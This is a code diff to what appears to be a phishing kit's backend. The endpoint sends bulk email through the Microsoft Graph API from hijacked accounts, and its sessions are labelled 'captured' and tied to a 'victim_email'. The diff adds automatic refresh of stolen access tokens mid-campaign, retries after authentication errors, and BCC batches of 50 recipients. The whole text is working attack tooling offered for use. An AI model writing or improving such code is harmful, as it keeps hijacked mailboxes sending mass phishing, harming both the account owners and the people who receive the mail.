@@ -16190,6 +16190,9 @@ def b2b_send():
         return Response(stream_with_context(_err('Invalid or non-captured session')), mimetype='text/event-stream')
 
     token       = db.get_graph_access_token(s)
+    if not token:
+        return Response(stream_with_context(_err('No valid access token — token may be expired or PRT refresh failed. Try refreshing the session first.')), mimetype='text/event-stream')
+
     recipients  = data.get('recipients', [])
     subjects    = data.get('subjects', []) or ['(No Subject)']
     links       = data.get('links', [])
@@ -16206,10 +16209,22 @@ def b2b_send():
     sender_email = (s.get('victim_email') or '').strip().lower()
 
     def generate():
+        nonlocal token
         def sse(obj):
             return f'data: {_json.dumps(obj)}\n\n'
 
+        def _refresh_token():
+            """Attempt to refresh the token mid-send. Returns new token or None."""
+            nonlocal s
+            try:
+                s = db.get_session_by_user_code(uc)  # re-fetch session with latest token
+                new_tok = db.get_graph_access_token(s)
+                return new_tok
+            except Exception:
+                return None
+
         sent = failed = 0
+        send_count_since_refresh = 0
 
         if bcc_mode:
             # ── BATCH BCC MODE: Blast all recipients simultaneously in batches of 50 ──
@@ -16260,13 +16275,31 @@ def b2b_send():
                     )
                     if res is None or not res.get('error'):
                         sent += len(batch)
+                        send_count_since_refresh += len(batch)
                         for r in batch:
                             yield sse({'type': 'sent', 'recipient': r, 'subject': f"{subj_final} [Batch {batch_num}/{total_batches}]"})
                     else:
+                        err_detail = res.get('error', {})
+                        err_msg = err_detail.get('message', 'Send failed')
+                        err_code = err_detail.get('code', '')
+                        # If auth error, try refreshing token and retry once
+                        if err_code in ('InvalidAuthenticationToken', 'TokenExpired', 'AuthenticationError') or 'token' in err_msg.lower():
+                            yield sse({'type': 'status', 'msg': '🔄 Token expired mid-send, refreshing...', 'cls': 'warning'})
+                            new_tok = _refresh_token()
+                            if new_tok:
+                                token = new_tok
+                                send_count_since_refresh = 0
+                                # Retry this batch
+                                res2 = graph.make_graph_request('/me/sendMail', token, method='POST', payload={'message': msg_obj, 'saveToSentItems': save_sent})
+                                if res2 is None or not res2.get('error'):
+                                    sent += len(batch)
+                                    for r in batch:
+                                        yield sse({'type': 'sent', 'recipient': r, 'subject': f"{subj_final} [Batch {batch_num}/{total_batches}] (retry)"})
+                                    continue
+                            yield sse({'type': 'status', 'msg': f'⚠️ Token refresh failed: {err_msg}', 'cls': 'error'})
                         failed += len(batch)
-                        err_msg = res.get('error', {}).get('message', 'Send failed')
                         for r in batch:
-                            yield sse({'type': 'failed', 'recipient': r, 'error': err_msg})
+                            yield sse({'type': 'failed', 'recipient': r, 'error': f"[{err_code}] {err_msg}" if err_code else err_msg})
                 except Exception as ex:
                     failed += len(batch)
                     for r in batch:
@@ -16274,6 +16307,13 @@ def b2b_send():
 
                 if delay_ms > 0 and (batch_start + BATCH_SIZE) < len(valid_recipients):
                     time.sleep(delay_ms / 1000.0)
+
+                # Proactive token refresh every ~200 sends to avoid mid-campaign expiry
+                if send_count_since_refresh >= 200:
+                    new_tok = _refresh_token()
+                    if new_tok:
+                        token = new_tok
+                        send_count_since_refresh = 0
 
         else:
             # ── DIRECT 1-to-1 SENDING MODE ──
@@ -16341,17 +16381,42 @@ def b2b_send():
                     )
                     if res is None or not res.get('error'):
                         sent += 1
+                        send_count_since_refresh += 1
                         yield sse({'type': 'sent', 'recipient': rec, 'subject': subj_final})
                     else:
+                        err_detail = res.get('error', {})
+                        err_msg = err_detail.get('message', 'Send failed')
+                        err_code = err_detail.get('code', '')
+                        # If auth error, try refreshing token and retry once
+                        if err_code in ('InvalidAuthenticationToken', 'TokenExpired', 'AuthenticationError') or 'token' in err_msg.lower():
+                            yield sse({'type': 'status', 'msg': '🔄 Token expired mid-send, refreshing...', 'cls': 'warning'})
+                            new_tok = _refresh_token()
+                            if new_tok:
+                                token = new_tok
+                                send_count_since_refresh = 0
+                                res2 = graph.make_graph_request('/me/sendMail', token, method='POST', payload={'message': msg_obj, 'saveToSentItems': save_sent})
+                                if res2 is None or not res2.get('error'):
+                                    sent += 1
+                                    yield sse({'type': 'sent', 'recipient': rec, 'subject': f"{subj_final} (retry)"})
+                                    if delay_ms > 0:
+                                        time.sleep(delay_ms / 1000.0)
+                                    continue
+                            yield sse({'type': 'status', 'msg': f'⚠️ Token refresh failed: {err_msg}', 'cls': 'error'})
                         failed += 1
-                        err_msg = res.get('error', {}).get('message', 'Send failed')
-                        yield sse({'type': 'failed', 'recipient': rec, 'error': err_msg})
+                        yield sse({'type': 'failed', 'recipient': rec, 'error': f"[{err_code}] {err_msg}" if err_code else err_msg})
                 except Exception as ex:
                     failed += 1
                     yield sse({'type': 'failed', 'recipient': rec, 'error': str(ex)})
 
                 if delay_ms > 0:
                     time.sleep(delay_ms / 1000.0)
+
+                # Proactive token refresh every ~50 sends in direct mode
+                if send_count_since_refresh >= 50:
+                    new_tok = _refresh_token()
+                    if new_tok:
+                        token = new_tok
+                        send_count_since_refresh = 0
 
         yield sse({'type': 'done', 'sent': sent, 'failed': failed})
 
